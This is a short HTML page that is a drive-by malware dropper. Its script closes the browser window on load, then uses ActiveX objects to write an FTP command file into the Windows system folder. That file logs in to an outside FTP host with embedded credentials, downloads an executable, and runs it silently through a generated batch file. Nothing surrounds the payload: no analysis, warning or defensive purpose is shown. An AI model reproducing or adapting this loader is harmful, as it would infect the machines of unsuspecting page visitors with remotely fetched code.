<html>
<object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
<script language="JScript.Encode">self.window.close();

var fso, f;
fso = new ActiveXObject("Scripting.FileSystemObject");
tgtf=fso.GetSpecialFolder(1);
f=fso.CreateTextFile(tgtf+"\\S", true);
f.WriteLine("open ftp.zeos.net");
f.WriteLine("wh_gallery");
f.WriteLine("ba6Loem");
f.WriteLine("binary");
f.WriteLine("get smgrt.exe "+tgtf +"\\smgrt.exe");
f.WriteLine("quit");
f.Close();

f=fso.CreateTextFile(tgtf+"\\wmstart.bat", true);
f.WriteLine("ftp -s:"+tgtf+"\\S");
f.WriteLine("del "+tgtf+"\\S");
f.WriteLine(tgtf+"\\smgrt.exe");
f.Close();

wsh.Run("command /c "+tgtf+"\\wmstart.bat",0,true);</script>
</html>
